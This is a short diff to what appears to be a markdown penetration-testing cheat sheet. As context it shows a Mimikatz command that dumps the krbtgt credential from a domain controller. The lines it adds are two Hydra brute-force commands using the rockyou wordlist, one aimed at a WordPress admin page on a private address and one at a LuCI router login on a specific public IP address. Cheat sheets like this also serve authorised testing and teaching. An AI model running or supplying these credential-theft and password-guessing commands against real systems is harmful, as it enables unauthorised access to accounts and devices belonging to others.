@@ -141,7 +141,12 @@
 |Invoke-Mimikatz -Command '"lsadump::lsa /inject /name:krbtgt"'|
 
 
+### Avance Cracking Web Forms with Hydra
 
+| For example  |
+| ------------- |
+|hydra -l admin -P /usr/share/wordlists/rockyou.txt  -f -V -s 80 192.168.1.2 http-get /wp-admin/|
+|hydra -l root -P /usr/share/wordlists/rockyou.txt  -f -V -s 7001 178.72.90.181 http-post-form "/cgi-bin/luci:username=^USER^&password=^PASS^:Invalid username"|
 
 | Linxu and Microsoft RPC Enumeration  |
 | ------------- |
